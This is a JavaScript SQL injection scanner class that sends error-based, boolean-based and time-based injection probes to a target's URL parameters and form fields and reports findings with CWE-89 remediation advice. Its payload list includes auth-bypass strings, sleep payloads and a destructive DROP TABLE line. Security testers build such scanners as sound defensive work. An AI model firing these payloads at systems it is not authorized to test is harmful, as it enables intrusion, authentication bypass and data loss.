import axios from 'axios';

const SQLI_PAYLOADS = [
  { payload: "' OR '1'='1", type: 'classic' },
  { payload: "' OR 1=1 --", type: 'comment' },
  { payload: "') OR ('1'='1", type: 'classic-bracket' },
  { payload: "'; DROP TABLE users; --", type: 'destructive' },
  { payload: "1' AND '1'='1", type: 'boolean-true' },
  { payload: "1' AND '1'='2", type: 'boolean-false' },
  { payload: "' UNION SELECT NULL,NULL,NULL--", type: 'union' },
  { payload: "' UNION SELECT 1,2,3--", type: 'union-numeric' },
  { payload: "1; WAITFOR DELAY '0:0:5'--", type: 'time-mssql' },
  { payload: "1' AND SLEEP(5)--", type: 'time-mysql' },
  { payload: "1' AND (SELECT 1 FROM PG_SLEEP(5))--", type: 'time-postgres' },
  { payload: "1 OR 1=1", type: 'numeric' },
  { payload: "admin'--", type: 'auth-bypass' },
  { payload: "admin' #", type: 'auth-bypass-hash' },
  { payload: "' OR 1=1/*", type: 'polyglot' },
];

const SQL_ERROR_PATTERNS = [
  /you have an error in your sql syntax/i,
  /warning:.*mysql/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /pg_query\(\)/i,
  /PostgreSQL.*ERROR/i,
  /SQLite3::query/i,
  /microsoft ole db provider for sql server/i,
  /\[microsoft\]\[odbc sql server driver\]/i,
  /oracle.*error/i,
  /ORA-\d{5}/i,
  /SQL syntax.*MySQL/i,
  /valid MySQL result/i,
  /mysql_fetch/i,
  /sqlite_.*error/i,
  /SQLSTATE\[/i,
  /syntax error.*SQL/i,
];

export class SQLiScanner {
  constructor(targetUrl, urls, forms) {
    this.targetUrl = targetUrl;
    this.urls = urls;
    this.forms = forms;
    this.vulnerabilities = [];
  }

  async scan() {
    // Test URL parameters
    for (const url of this.urls.slice(0, 15)) {
      await this.testUrlParams(url);
      await this.testTimeBased(url);
    }

    // Test forms
    for (const form of this.forms.slice(0, 10)) {
      await this.testFormInputs(form);
    }

    return this.vulnerabilities;
  }

  async testTimeBased(url) {
    try {
      const parsed = new URL(url);
      const params = [...parsed.searchParams.keys()];
      const timePayloads = SQLI_PAYLOADS.filter(p => p.type.startsWith('time-'));

      for (const param of params) {
        // Measure baseline
        const startBase = Date.now();
        await axios.get(url, { timeout: 10000, validateStatus: () => true });
        const baselineTime = Date.now() - startBase;

        for (const { payload } of timePayloads) {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, payload);
          
          const start = Date.now();
          try {
            await axios.get(testUrl.href, { timeout: 15000, validateStatus: () => true });
            const duration = Date.now() - start;

            // If response took significantly longer than baseline (at least 5s longer)
            if (duration > baselineTime + 4500) {
              this.vulnerabilities.push({
                type: 'SQL Injection',
                severity: 'critical',
                title: `Time-based Blind SQL Injection: ${param}`,
                description: `The parameter "${param}" is vulnerable to time-based blind SQL injection. The application's response time can be controlled by injecting SQL sleep/delay commands.`,
                url: url,
                parameter: param,
                evidence: `Baseline: ${baselineTime}ms, Injected: ${duration}ms (Payload: ${payload})`,
                remediation: 'Use parameterized queries. Never concatenate user input into SQL strings. Ensure the database user has limited privileges.',
                cvssScore: 9.8,
                cweId: 'CWE-89',
                owaspCategory: 'A03:2021 - Injection'
              });
              break; // Found vulnerability for this param
            }
          } catch {}
        }
      }
    } catch {}
  }

  async testUrlParams(url) {
    try {
      const parsed = new URL(url);
      const params = [...parsed.searchParams.keys()];

      for (const param of params) {
        // Get baseline response
        let baselineResponse;
        try {
          baselineResponse = await axios.get(url, { timeout: 5000, validateStatus: () => true });
        } catch { continue; }

        // Error-based detection
        const errorUrl = new URL(url);
        errorUrl.searchParams.set(param, "'");
        try {
          const response = await axios.get(errorUrl.href, { timeout: 5000, validateStatus: () => true });
          if (typeof response.data === 'string' && this.containsSQLError(response.data)) {
            this.vulnerabilities.push({
              type: 'SQL Injection',
              severity: 'critical',
              title: `SQL Injection via URL parameter: ${param}`,
              description: `The parameter "${param}" is vulnerable to SQL injection. A single quote character causes a database error, indicating unsanitized input is directly concatenated into SQL queries.`,
              url: url,
              parameter: param,
              evidence: 'SQL error message revealed when injecting single quote character',
              remediation: 'Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and use an ORM. Never expose raw database errors to users.',
              cvssScore: 9.8,
              cweId: 'CWE-89',
              owaspCategory: 'A03:2021 - Injection'
            });
            continue;
          }
        } catch {}

        // Boolean-based detection
        try {
          const trueUrl = new URL(url);
          trueUrl.searchParams.set(param, `${parsed.searchParams.get(param)}' AND '1'='1`);
          const falseUrl = new URL(url);
          falseUrl.searchParams.set(param, `${parsed.searchParams.get(param)}' AND '1'='2`);

          const [trueResp, falseResp] = await Promise.all([
            axios.get(trueUrl.href, { timeout: 5000, validateStatus: () => true }),
            axios.get(falseUrl.href, { timeout: 5000, validateStatus: () => true })
          ]);

          if (typeof trueResp.data === 'string' && typeof falseResp.data === 'string' &&
              typeof baselineResponse.data === 'string') {
            const baseLen = baselineResponse.data.length;
            const trueLen = trueResp.data.length;
            const falseLen = falseResp.data.length;

            // If true condition matches baseline but false condition differs significantly
            if (Math.abs(baseLen - trueLen) < baseLen * 0.1 && Math.abs(baseLen - falseLen) > baseLen * 0.2) {
              this.vulnerabilities.push({
                type: 'SQL Injection',
                severity: 'critical',
                title: `Boolean-based Blind SQL Injection: ${param}`,
                description: `The parameter "${param}" is vulnerable to boolean-based blind SQL injection. The application responds differently based on TRUE/FALSE SQL conditions injected into the parameter.`,
                url: url,
                parameter: param,
                evidence: `Response length difference: TRUE condition (${trueLen} bytes) vs FALSE condition (${falseLen} bytes)`,
                remediation: 'Use parameterized queries. Implement strict input validation. Apply the principle of least privilege to database accounts.',
                cvssScore: 9.8,
                cweId: 'CWE-89',
                owaspCategory: 'A03:2021 - Injection'
              });
            }
          }
        } catch {}
      }
    } catch {}
  }

  async testFormInputs(form) {
    try {
      for (const input of form.inputs) {
        if (!input.name || ['submit', 'button', 'hidden', 'csrf', 'token', 'checkbox', 'radio'].some(t => 
          input.name.toLowerCase().includes(t) || input.type === t)) continue;

        // Error-based test
        const data = {};
        form.inputs.forEach(i => { data[i.name] = i.value || 'test'; });
        data[input.name] = "'";

        try {
          const response = form.method === 'POST'
            ? await axios.post(form.action, data, { timeout: 5000, validateStatus: () => true })
            : await axios.get(form.action, { params: data, timeout: 5000, validateStatus: () => true });

          if (typeof response.data === 'string' && this.containsSQLError(response.data)) {
            this.vulnerabilities.push({
              type: 'SQL Injection',
              severity: 'critical',
              title: `SQL Injection in form field: ${input.name}`,
              description: `The form field "${input.name}" on ${form.pageUrl} is vulnerable to SQL injection via ${form.method} request to ${form.action}.`,
              url: form.pageUrl,
              parameter: input.name,
              evidence: 'SQL error triggered by single quote injection in form field',
              remediation: 'Use parameterized queries for all database operations. Validate and sanitize all form inputs server-side.',
              cvssScore: 9.8,
              cweId: 'CWE-89',
              owaspCategory: 'A03:2021 - Injection'
            });
          }
        } catch {}
      }
    } catch {}
  }

  containsSQLError(responseBody) {
    return SQL_ERROR_PATTERNS.some(pattern => pattern.test(responseBody));
  }
}
